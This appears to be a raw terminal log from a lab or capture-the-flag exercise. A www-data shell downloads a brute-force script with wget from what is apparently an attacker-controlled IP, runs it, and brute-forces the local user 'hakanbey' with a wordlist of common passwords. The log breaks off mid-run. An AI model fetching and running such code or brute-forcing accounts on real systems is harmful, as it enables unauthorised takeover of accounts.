+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ [7mfile ./sucrack[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfile ./sucrack
+[Kfile ./sucrack
+[K./sucrack: ELF 64-bit LSB shared object, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=7c33518aca8ffc18ef397240e59abe6452b320f1, stripped
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ uname -m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004huname -m
+[Kuname -m
+x86_64
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ su hakanbey[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsu hakanbey
+[Ksu hakanbey
+[KPassword: [KPassword: [K[?2004hPassword: test[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004htest
+[K
+[Ksu: Authentication failure
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ cd >t;p[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd >t;p
+[Kcd >t;p
+bash: cd: HOME not set
+bash: p: command not found
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ cd §[K/tmp[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /tmp
+[Kcd /tmp
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+custom.txt  sucrack  sucrack_1.2.3-5_arm64.deb
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ [7mwget http://10.8.61.245/sucrack[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwget http://10.8.61.245/sucrack.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwget http://10.8.61.245/sucrack.sh
+[Kwget http://10.8.61.245/sucrack.sh
+--2025-02-21 07:41:56--  http://10.8.61.245/sucrack.sh
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 1079 (1.1K) [text/x-sh]
+Saving to: 'sucrack.sh'
+
+sucrack.sh            0%[                    ]       0  --.-KB/s               sucrack.sh          100%[===================>]   1.05K  --.-KB/s    in 0s      
+
+2025-02-21 07:41:56 (193 MB/s) - 'sucrack.sh' saved [1079/1079]
+
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ chmod +x sucrack.sh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hchmod +x sucrack.sh
+[Kchmod +x sucrack.sh
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+custom.txt  sucrack  sucrack.sh  sucrack_1.2.3-5_arm64.deb
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ./sucrack.sh -u hakanbey -w custom.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./sucrack.sh -u hakanbey -w custom.txt
+[K./sucrack.sh -u hakanbey -w custom.txt
+Starting brute-force attack on user: hakanbey
+Trying password: 123ada123456
+./sucrack.sh: line 31: echo: write error: Broken pipe[K./sucrack.sh: line 31: echo: write error: Broken pipe[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada12345
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada123456789
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapassword
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adailoveyou
+Trying password: 123adaprincess
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada1234567
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adarockyou
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada12345678
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaabc123
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adanicole
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadaniel
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adababygirl
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamonkey
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalovely
+Trying password: 123adajessica
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada654321
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamichael
+./sucrack.sh: line 31: echo: write error: Broken pipe[K./sucrack.sh: line 31: echo: write error: Broken pipe[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaashley
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaqwerty
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada111111
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adailoveu
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada000000
+Trying password: 123adamichelle
+[KTrying password: 123adatigger
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasunshine
+Trying password: 123adachocolate
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapassword1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasoccer
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaanthony
+Trying password: 123adafriends
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabutterfly
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapurple
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaangel
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajordan
+Trying password: 123adaliverpool
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajustin
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaloveme
+Trying password: 123adafuckyou
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada123123
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafootball
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasecret
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaandrea
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacarlos
+Trying password: 123adajennifer
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajoshua
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabubbles
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada1234567890
+Trying password: 123adasuperman
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahannah
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaamanda
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaloveyou
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapretty
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabasketball
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaandrew
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaangels
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adatweety
+Trying password: 123adaflower
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaplayboy
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahello
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaelizabeth[KTrying password: 123adaelizabeth[KTrying password: 123adaelizabeth
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahottie
+Trying password: 123adatinkerbell
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacharlie
+[KTrying password: 123adasamantha
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabarbie
+Trying password: 123adachelsea
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalovers
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adateamo
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajasmine
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabrandon
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada666666
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adashadow
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamelissa
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaeminem
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamatthew
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adarobert
+Trying password: 123adadanielle
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaforever
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafamily
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajonathan
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada987654321
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacomputer
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adawhatever
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadragon
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adavanessa
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacookie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adanaruto
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasummer
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasweety
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaspongebob
+Trying password: 123adajoseph
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajunior
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasoftball
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adataylor
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adayellow
+[KTrying password: 123adadaniela
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalauren
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamickey
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaprincesa
+Trying password: 123adaalexandra
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaalexis
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajesus
+[KTrying password: 123adaestrella
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamiguel
+Trying password: 123adawilliam
+Trying password: 123adathomas
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabeautiful
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamylove
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaangela
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapoohbear
+Trying password: 123adapatrick
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adailoveme
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasakura
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaadrian
+Trying password: 123adaalexander
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadestiny
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adachristian
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada121212
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasayang
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaamerica
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadancer
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamonica
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adarichard
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada112233
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaprincess1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada555555
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadiamond
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacarolina
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasteven
+Trying password: 123adarangers
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalouise
+[KTrying password: 123adaorange
+Trying password: 123ada789456
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada999999
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adashorty
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada11111
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adanathan
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasnoopy
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagabriel
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahunter
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacherry
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakiller
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasandra
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaalejandro
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabuster
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adageorge
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabrittany
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaalejandra
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapatricia
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adarachel
+Trying password: 123adatequiero
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada7777777
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacheese
+[KTrying password: 123ada159753
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaarsenal
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadolphin
+Trying password: 123adaantonio
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaheather
+[KTrying password: 123adadavid
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaginger
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adastephanie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapeanut
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adablink182
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasweetie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada222222
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabeauty
+Trying password: 123ada987654
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adavictoria
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahoney
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada00000
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafernando
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapokemon
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamaggie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacorazon
+Trying password: 123adachicken
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapepper
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacristina
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adarainbow
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakisses
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamanuel
+Trying password: 123adamyspace
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adarebelde
+[KTrying password: 123adaangel1
+Trying password: 123adaricardo
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adababygurl
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaheaven
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada55555
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabaseball
+[KTrying password: 123adamartin
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagreenday
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adanovember
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaalyssa
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamadison
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamother
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada123321
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada123abc
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamahalkita
+Trying password: 123adabatman
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaseptember
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadecember
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamorgan
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamariposa
+[KTrying password: 123adamaria
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagabriela
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adailoveyou2
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabailey
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajeremy
+Trying password: 123adapamela
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakimberly
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagemini
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adashannon
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapictures
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaasshole
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasophie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajessie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahellokitty
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaclaudia
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adababygirl1
+[KTrying password: 123adaangelica
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaaustin
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamahalko
+[KTrying password: 123adavictor
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahorses
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adatiffany
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamariana
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaeduardo
+[KTrying password: 123adaandres
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacourtney
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabooboo
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakissme
+Trying password: 123adaharley
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaronaldo
+Trying password: 123adailoveyou1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaprecious
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaoctober
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adainuyasha
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapeaches
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaveronica
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adachris
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada888888
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaadriana
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacutie
+[KTrying password: 123adajames
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabanana
+Trying password: 123adaprince
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafriend
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajesus1
+Trying password: 123adacrystal
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaceltic
+Trying password: 123adazxcvbnm
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaedward
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaoliver
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadiana
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasamsung
+Trying password: 123adafreedom
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaangelo
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakenneth
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamaster
+Trying password: 123adascooby
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacarmen
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada456789
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasebastian
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adarebecca
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajackie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaspiderman
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adachristopher
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakarina
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajohnny
+Trying password: 123adahotmail
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada0123456789
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaschool
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabarcelona
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaaugust
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaorlando
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasamuel
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacameron
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaslipknot
+[KTrying password: 123adacutiepie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamonkey1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada50cent
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabonita
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakevin
+[KTrying password: 123adabitch
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamaganda
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adababyboy
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacasper
+Trying password: 123adabrenda
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaadidas
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakitten
+[KTrying password: 123adakaren
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamustang
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaisabel
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adanatalie
+Trying password: 123adacuteako
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajavier
+Trying password: 123ada789456123
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada123654
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasarah
+[KTrying password: 123adabowwow
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaportugal
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalaura
+Trying password: 123ada777777
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamarvin
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadenise
+Trying password: 123adatigers
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adavolleyball
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajasper
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adarockstar
+Trying password: 123adajanuary
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafuckoff
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaalicia
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adanicholas
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaflowers
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacristian
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adatintin
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabianca
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adachrisbrown
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adachester
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada101010
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasmokey
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasilver
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adainternet
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasweet
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adastrawberry
+Trying password: 123adagarfield
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadennis
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapanget
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafrancis
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacassie
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabenfica
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalove123
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada696969
+Trying password: 123adaasdfgh
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalollipop
+[KTrying password: 123adaolivia
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacancer
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacamila
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaqwertyuiop
+Trying password: 123adasuperstar
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaharrypotter
+[KTrying password: 123adaihateyou
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacharles
+Trying password: 123adamonique
